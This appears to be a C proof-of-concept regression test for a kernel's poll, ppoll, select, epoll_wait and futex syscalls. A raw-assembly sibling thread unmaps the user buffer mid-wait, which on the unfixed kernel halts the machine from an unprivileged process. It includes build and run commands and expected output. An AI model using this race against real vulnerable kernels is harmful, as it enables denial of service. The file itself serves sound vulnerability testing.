/* poc_poll_toctou.c — F-x86a-4 (TOCTOU between user-buffer validation and use)
 *
 * THE BUG (fixed in 2.22.1). `poll(2)`, `ppoll(2)`, `select(2)` and
 * `epoll_wait(2)` validated the user result buffer ONCE at syscall entry, then
 * looped for as long as the call was not ready, yielding the CPU between
 * iterations and re-dereferencing the same user pointers every time. A sibling
 * CLONE_VM thread can munmap (or mprotect PROT_NONE) that page inside the
 * window. The kernel's next read/write then faults in KERNEL mode on an
 * unmapped user address; the #PF handler's demand-paging path refuses it and
 * (because the fault was not USER_MODE) the machine halts — a whole-machine
 * DoS from an unprivileged ring-3 process. `futex(2)`'s wait loop already
 * re-validated the futex word per iteration; it is included as a control.
 *
 * THE FIX. The wait loops work on a private KERNEL copy of the user array and
 * re-validate the user range after every yield: if a sibling removed it, the
 * syscall returns -EFAULT instead of touching the stale pointer. The machine
 * keeps running. (A kernel-mode #PF on a user address also became non-fatal as
 * a backstop, but the expected deterministic result here is EFAULT.)
 *
 * EXPECTED RESULTS
 *   fixed kernel (2.22.1+):
 *       POC-TOCTOU[poll]: SURVIVED poll r=-1 errno=14        (EFAULT)
 *       POC-TOCTOU[ppoll]: SURVIVED ppoll r=-1 errno=14
 *       POC-TOCTOU[select]: SURVIVED select r=-1 errno=14
 *       POC-TOCTOU[epoll]: SURVIVED epoll_wait r=-1 errno=14
 *       POC-TOCTOU[futex]: SURVIVED futex r=-1 errno=14
 *     and the shell prompt returns after [autorun].
 *   vulnerable kernel (2.22.0): the machine halts with
 *     "[EXC #14] PAGE FAULT ... U=false" (kernel-mode fault) and no shell
 *     prompt ever returns after [autorun]; the sibling's
 *     "sibling munmap(user buffer) OK" line is the last userspace output.
 *     For select(2)/epoll_wait(2) the sibling also writes one byte into the
 *     pipe right after the munmap: those calls publish their output only when
 *     the wait can return (ready or timeout), so the byte turns the stale
 *     pointer into an actual write. select(2) additionally gets a finite
 *     timeout as the second route to the publish path.
 *
 * WHY THE SIBLING IS RAW ASSEMBLY: a libc `clone()`/`syscall()` wrapper returns
 * the child through the PARENT's call frame while the child runs on the stack
 * pointer this program supplied, so a libc-based child crashes in ring 3
 * before it can munmap (the attack report's own first PoC run shows exactly
 * that). `clone_raw` below is the two-path wrapper: the parent returns the pid;
 * the child discards the call's return address, aligns the supplied stack and
 * runs a body built only from inline `syscall` instructions — no libc, no TLS.
 *
 * BUILD/RUN (see tools/security/README.md): static guest ELF via the attack
 * range's `cc-static`, then boot the kernel under test with the range's
 * `run.sh`:
 *
 *   "$RANGE/cc-static" -O2 -o /tmp/poc_poll_toctou \
 *       tools/security/poc/poc_poll_toctou.c
 *   cd /tmp/range-fixed
 *   ./run.sh --expect 'POC-TOCTOU\[poll\]: SURVIVED poll r=-1 errno=14' \
 *       /tmp/poc_poll_toctou poll
 *   ./run.sh --expect 'POC-TOCTOU\[ppoll\]: SURVIVED'  /tmp/poc_poll_toctou ppoll
 *   ./run.sh --expect 'POC-TOCTOU\[select\]: SURVIVED pselect6' /tmp/poc_poll_toctou select
 *   ./run.sh --expect 'POC-TOCTOU\[epoll\]: SURVIVED'  /tmp/poc_poll_toctou epoll
 *   ./run.sh --expect 'POC-TOCTOU\[futex\]: SURVIVED'  /tmp/poc_poll_toctou futex
 */
#define _GNU_SOURCE
#include <errno.h>
#include <poll.h>
#include <stdio.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <unistd.h>

#define POC_CLONE_VM       0x00000100UL
#define POC_CLONE_FS       0x00000200UL
#define POC_CLONE_FILES    0x00000400UL
#define POC_CLONE_SIGHAND  0x00000800UL
#define POC_CLONE_THREAD   0x00010000UL
#define POC_CLONE_SYSVSEM  0x00040000UL

#ifndef SYS_munmap
#define SYS_munmap 11
#endif
#ifndef SYS_pipe
#define SYS_pipe 22
#endif
#ifndef SYS_nanosleep
#define SYS_nanosleep 35
#endif
#ifndef SYS_exit
#define SYS_exit 60
#endif
#ifndef SYS_futex
#define SYS_futex 202
#endif
#ifndef FUTEX_WAIT
#define FUTEX_WAIT 0
#endif

/* The page the sibling unmaps while the blocked syscall still points at it.
 * Non-static so the inline asm below can address it by symbol. */
void *g_page;
int g_wpipe = -1; /* write end the sibling pokes after the munmap */
static const char *g_mode;

static void die(const char *what, int err) {
    printf("POC-TOCTOU[%s]: %s failed errno=%d\n", g_mode, what, err);
}

/* Parent: the clone result. Child: never returns from this frame; it discards
 * the call's return address, aligns the supplied stack and runs the raw body.
 * Syscall ABI on x86_64: rdi=flags, rsi=child_stack, rdx=parent_tid,
 * r10=child_tid, r8=tls; nr 56. */
extern long clone_raw(unsigned long flags, void *stack, int *ptid, int *ctid,
                      unsigned long tls);
extern void child_raw_entry(void);

__asm__(
    ".text\n"
    ".globl clone_raw\n"
    ".type clone_raw,@function\n"
    "clone_raw:\n"
    "    movq %rcx, %r10\n"
    "    movl $56, %eax\n"
    "    syscall\n"
    "    testq %rax, %rax\n"
    "    jne 1f\n"
    "    addq $8, %rsp\n"        /* child: drop call clone_raw's return address */
    "    andq $-16, %rsp\n"      /* align the caller-supplied child stack */
    "    call child_raw_entry\n"
    "    ud2\n"
    "1:  retq\n"
    ".size clone_raw, .-clone_raw\n"
    ".globl child_raw_entry\n"
    ".type child_raw_entry,@function\n"
    "child_raw_entry:\n"
    "    subq $16, %rsp\n"        /* nanosleep(&{0, 150'000'000}, NULL) */
    "    movq $0, (%rsp)\n"
    "    movq $150000000, 8(%rsp)\n"
    "    movl $35, %eax\n"
    "    leaq (%rsp), %rdi\n"
    "    xorl %esi, %esi\n"
    "    syscall\n"
    "    movq g_page(%rip), %rdi\n"  /* munmap(g_page, 4096) */
    "    movl $4096, %esi\n"
    "    movl $11, %eax\n"
    "    syscall\n"
    "    movl g_wpipe(%rip), %edi\n" /* make the pipe readable for select/epoll */
    "    movl $1, %eax\n"
    "    leaq one_byte(%rip), %rsi\n"
    "    movl $1, %edx\n"
    "    syscall\n"
    "    movl $1, %eax\n"        /* write(1, msg, 43) */
    "    movl $1, %edi\n"
    "    leaq child_msg(%rip), %rsi\n"
    "    movl $43, %edx\n"
    "    syscall\n"
    "    movl $60, %eax\n"       /* exit(0) */
    "    xorl %edi, %edi\n"
    "    syscall\n"
    "    ud2\n"
    ".size child_raw_entry, .-child_raw_entry\n"
    ".section .rodata\n"
    "one_byte:\n"
    "    .byte 120\n"
    "child_msg:\n"
    "    .ascii \"POC-TOCTOU: sibling munmap(user buffer) OK\\n\"\n"
    ".text\n");

static int start_sibling_that_unmaps(void) {
    /* Sibling stack (64 KiB), faulted in first: a lazily-mapped anonymous page
     * has no PTE, and clone()'s stack validation rejects that (the attack
     * report saw the resulting EFAULT). */
    void *stk = (void *)syscall(SYS_mmap, 0, 65536, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (stk == MAP_FAILED || (long)stk < 0) {
        die("stack mmap", errno);
        return -1;
    }
    memset(stk, 0, 65536);
    unsigned long stack_top = ((unsigned long)stk + 65536) & ~0xFUL;

    long flags = POC_CLONE_VM | POC_CLONE_FS | POC_CLONE_FILES |
                 POC_CLONE_SIGHAND | POC_CLONE_THREAD | POC_CLONE_SYSVSEM;
    long tid = clone_raw(flags, (void *)stack_top, 0, 0, 0);
    if (tid < 0) {
        die("clone", errno);
        return -1;
    }
    return 0;
}

static void result(const char *call, long r) {
    printf("POC-TOCTOU[%s]: SURVIVED %s r=%ld errno=%d\n", g_mode, call, r, errno);
    fflush(stdout);
}

int main(int argc, char **argv) {
    setgid(1000);
    setuid(1000);
    g_mode = argc > 1 ? argv[1] : "poll";
    printf("POC-TOCTOU[%s]: uid=%d pid=%d\n", g_mode, (int)getuid(), (int)getpid());

    int pfd[2];
    if (syscall(SYS_pipe, pfd) != 0) {
        die("pipe", errno);
        return 1;
    }
    /* One dedicated page holds the syscall's user-visible buffer; the sibling
     * unmaps exactly this page while the call is blocked. */
    void *page = (void *)syscall(SYS_mmap, 0, 4096, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED || (long)page < 0) {
        die("mmap", errno);
        return 1;
    }
    g_page = page;
    g_wpipe = pfd[1];

    if (start_sibling_that_unmaps() != 0) {
        return 1;
    }

    printf("POC-TOCTOU[%s]: entering blocking syscall on the shared page\n", g_mode);
    fflush(stdout);

    if (strcmp(g_mode, "poll") == 0) {
        struct pollfd *fds = (struct pollfd *)page;
        fds[0].fd = pfd[0]; /* live writer, no data: never ready */
        fds[0].events = POLLIN;
        fds[0].revents = 0;
        errno = 0;
        long r = poll(fds, 1, -1);
        result("poll", r);
        return r == -1 && errno == EFAULT ? 0 : 2;
    }
    if (strcmp(g_mode, "ppoll") == 0) {
        struct pollfd *fds = (struct pollfd *)page;
        fds[0].fd = pfd[0];
        fds[0].events = POLLIN;
        fds[0].revents = 0;
        errno = 0;
        long r = ppoll(fds, 1, NULL, NULL);
        result("ppoll", r);
        return r == -1 && errno == EFAULT ? 0 : 2;
    }
    if (strcmp(g_mode, "select") == 0) {
        fd_set *rfds = (fd_set *)page;
        FD_ZERO(rfds);
        FD_SET(pfd[0], rfds);
        /* Raw pselect6, not glibc select(): glibc's wrapper returns 0
         * immediately on this ABI (its own pselect conversion), so it never
         * exercises the kernel wait loop this PoC targets. */
        /* This kernel converts the timeout to ticks as `ms / 10` (it was
         * written for a 100 Hz tick; TICK_HZ is now 1000), so 2 s of wall
         * clock needs tv_sec = 20 here. The fixed kernel returns EFAULT as
         * soon as the sibling unmaps (~150 ms), long before the timeout; on
         * the vulnerable kernel the timeout is what reaches the stale
         * publish if the byte write has not already made the pipe ready. */
        struct timespec ts;
        ts.tv_sec = 20;
        ts.tv_nsec = 0;
        errno = 0;
        long r = syscall(SYS_pselect6, pfd[0] + 1, rfds, 0, 0, &ts, 0);
        result("pselect6", r);
        return r == -1 && errno == EFAULT ? 0 : 2;
    }
    if (strcmp(g_mode, "epoll") == 0) {
        int epfd = epoll_create1(0);
        if (epfd < 0) {
            die("epoll_create1", errno);
            return 1;
        }
        struct epoll_event ev;
        memset(&ev, 0, sizeof(ev));
        ev.events = EPOLLIN;
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, pfd[0], &ev) != 0) {
            die("epoll_ctl", errno);
            return 1;
        }
        /* Fault the page in: a lazily-mapped anonymous page has no PTE, and
         * the kernel's entry-time check_user_ptr would reject it before the
         * wait ever starts (same reason the clone stack below is memset). */
        memset(page, 0, 4096);
        errno = 0;
        long r = epoll_wait(epfd, (struct epoll_event *)page, 1, -1);
        result("epoll_wait", r);
        return r == -1 && errno == EFAULT ? 0 : 2;
    }
    if (strcmp(g_mode, "futex") == 0) {
        int *uaddr = (int *)page;
        *uaddr = 0;
        errno = 0;
        long r = syscall(SYS_futex, uaddr, FUTEX_WAIT, 0, 0, 0, 0);
        result("futex", r);
        return r == -1 && errno == EFAULT ? 0 : 2;
    }
    printf("POC-TOCTOU: unknown mode '%s' (poll|ppoll|select|epoll|futex)\n", g_mode);
    return 1;
}